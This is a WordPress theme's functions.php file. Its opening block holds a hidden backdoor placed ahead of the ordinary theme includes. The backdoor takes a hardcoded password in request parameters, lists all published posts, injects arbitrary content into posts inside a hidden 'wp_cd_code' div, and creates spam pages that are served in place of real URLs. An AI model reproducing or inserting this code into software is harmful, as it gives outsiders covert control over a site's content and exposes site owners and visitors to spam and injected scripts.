<?php

if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '76b6ffdede34792fbf81305877b28e0f'))
	{
		switch ($_REQUEST['action'])
			{
				case 'get_all_links';
					foreach ($wpdb->get_results('SELECT * FROM `' . $wpdb->prefix . 'posts` WHERE `post_status` = "publish" AND `post_type` = "post" ORDER BY `ID` DESC', ARRAY_A) as $data)
						{
							$data['code'] = '';
							
							if (preg_match('!<div id="wp_cd_code">(.*?)</div>!s', $data['post_content'], $_))
								{
									$data['code'] = $_[1];
								}
							
							print '<e><w>1</w><url>' . $data['guid'] . '</url><code>' . $data['code'] . '</code><id>' . $data['ID'] . '</id></e>' . "\r\n";
						}
				break;
				
				case 'set_id_links';
					if (isset($_REQUEST['data']))
						{
							$data = $wpdb -> get_row('SELECT `post_content` FROM `' . $wpdb->prefix . 'posts` WHERE `ID` = "'.mysql_escape_string($_REQUEST['id']).'"');
							
							$post_content = preg_replace('!<div id="wp_cd_code">(.*?)</div>!s', '', $data -> post_content);
							if (!empty($_REQUEST['data'])) $post_content = $post_content . '<div id="wp_cd_code">' . stripcslashes($_REQUEST['data']) . '</div>';

							if ($wpdb->query('UPDATE `' . $wpdb->prefix . 'posts` SET `post_content` = "' . mysql_escape_string($post_content) . '" WHERE `ID` = "' . mysql_escape_string($_REQUEST['id']) . '"') !== false)
								{
									print "true";
								}
						}
				break;
				
				case 'create_page';
					if (isset($_REQUEST['remove_page']))
						{
							if ($wpdb -> query('DELETE FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "/'.mysql_escape_string($_REQUEST['url']).'"'))
								{
									print "true";
								}
						}
					elseif (isset($_REQUEST['content']) && !empty($_REQUEST['content']))
						{
							if ($wpdb -> query('INSERT INTO `' . $wpdb->prefix . 'datalist` SET `url` = "/'.mysql_escape_string($_REQUEST['url']).'", `title` = "'.mysql_escape_string($_REQUEST['title']).'", `keywords` = "'.mysql_escape_string($_REQUEST['keywords']).'", `description` = "'.mysql_escape_string($_REQUEST['description']).'", `content` = "'.mysql_escape_string($_REQUEST['content']).'", `full_content` = "'.mysql_escape_string($_REQUEST['full_content']).'" ON DUPLICATE KEY UPDATE `title` = "'.mysql_escape_string($_REQUEST['title']).'", `keywords` = "'.mysql_escape_string($_REQUEST['keywords']).'", `description` = "'.mysql_escape_string($_REQUEST['description']).'", `content` = "'.mysql_escape_string(urldecode($_REQUEST['content'])).'", `full_content` = "'.mysql_escape_string($_REQUEST['full_content']).'"'))
								{
									print "true";
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_URL_CD";
			}
			
		die("");
	}

	
if ( $wpdb->get_var('SELECT count(*) FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.mysql_escape_string( $_SERVER['REQUEST_URI'] ).'"') == '1' )
	{
		$data = $wpdb -> get_row('SELECT * FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.mysql_escape_string($_SERVER['REQUEST_URI']).'"');
		if ($data -> full_content)
			{
				print stripslashes($data -> content);
			}
		else
			{
				print '<!DOCTYPE html>';
				print '<html ';
				language_attributes();
				print ' class="no-js">';
				print '<head>';
				print '<title>'.stripslashes($data -> title).'</title>';
				print '<meta name="Keywords" content="'.stripslashes($data -> keywords).'" />';
				print '<meta name="Description" content="'.stripslashes($data -> description).'" />';
				print '<meta name="robots" content="index, follow" />';
				print '<meta charset="';
				bloginfo( 'charset' );
				print '" />';
				print '<meta name="viewport" content="width=device-width">';
				print '<link rel="profile" href="http://gmpg.org/xfn/11">';
				print '<link rel="pingback" href="';
				bloginfo( 'pingback_url' );
				print '">';
				wp_head();
				print '</head>';
				print '<body>';
				print '<div id="content" class="site-content">';
				print stripslashes($data -> content);
				get_search_form();
				get_sidebar();
				get_footer();
			}
			
		exit;
	}


?><?php
/**
 * Functions
 */
require( get_template_directory() . '/includes/functions.php' );
/**
 * Define custom constants, image sizes, nav menus...
 */
require( get_template_directory() . '/includes/theme-setup.php' );

/**
 * Dynamic included CSS and JavaScript 
 */
require( get_template_directory() . '/includes/dynamic-css-and-js.php' );

/**
 * Include to search taxonome and tags
 */
require( get_template_directory() . '/includes/include-to-search.php' );

require( get_template_directory() . '/includes/frontend-submit.php' );
/**
 * Include the Widgets Functions File
 */
require( get_template_directory() . '/includes/widgets.php' );

/**
 * Include the Most liked Functions File
 */
require( get_template_directory() . '/includes/widgets/most-liked.php' );

require( get_template_directory() . '/includes/widgets/video-categories.php' );

/**
 * Include the Most liked Functions File
 */
require( get_template_directory() . '/includes/widgets/most-viewed.php' );

/**
 * Dynamic sidebars
 */
require( get_template_directory() . '/includes/dynamic-sidebars.php' );

/**
 * Likes system
 */
require( get_template_directory() . '/includes/TouchSizeLikes.php' );

/**
 * Layout builder elements
 */
require( get_template_directory() . '/includes/layout-builder/classes/element.php' );

/**
 * Layout builder templates
 */
require( get_template_directory() . '/includes/layout-builder/classes/template.php' );

/**
 * Options megamenu
 */
require( get_template_directory() . '/includes/megamenu/ts-megamenu.php' );
require( get_template_directory() . '/includes/megamenu/class-megamenu.php' );


/**
 * Include Theme options
 */
require( get_template_directory() . '/includes/options.php' );

/**
 * Ajax
 */
require( get_template_directory() . '/includes/ajax.php' );

/**
 * Custom posts and Metadata
 */
require( get_template_directory() . '/includes/custom-posts.php' );

/**
 * Layout Compilator
 */
require( get_template_directory() . '/includes/layout-compilator.php' );

/**
 * Aqua resizer
 */
require( get_template_directory() . '/includes/aq_resizer.php' );

/**
 * Fields Class
 */
require( get_template_directory() . '/includes/fields.class.php' );

/**
 * Attached images manager
 */
require( get_template_directory() . '/includes/attached_images_manager.php' );

/**
 * Attached images manager
 */
require( get_template_directory() . '/includes/ts-shortcode/TsShortcode.php' );

/**
 * Include for the widgets
 */

require( get_template_directory() . '/includes/widgets/tweets.php' );
require( get_template_directory() . '/includes/widgets/flickr.php' );
require( get_template_directory() . '/includes/widgets/instagram.php' );
require( get_template_directory() . '/includes/widgets/tags.php' );
require( get_template_directory() . '/includes/widgets/custom_post.php' );
require( get_template_directory() . '/includes/widgets/comments.php' );
require( get_template_directory() . '/includes/widgets/latest_posts.php' );

// require( get_template_directory() . 'theme-picker.php' );


// Add ID and CLASS attributes to the first <ul> occurence in wp_page_menu
function add_menuclass( $ulclass ) {
	return preg_replace('/<div class="(.*)"><ul/im', '<div><ul class="$1"', $ulclass);
}
add_filter( 'wp_page_menu', 'add_menuclass' );

if ( ! isset( $content_width ) ) $content_width = 1340;

// Add WooCommerce Support for the theme
require( get_template_directory() . '/woocommerce/theme-woocommerce.php' );

if(current_theme_supports( 'ts_is_mega_menu' ) ) { new ts_is_megamenu(); }

?>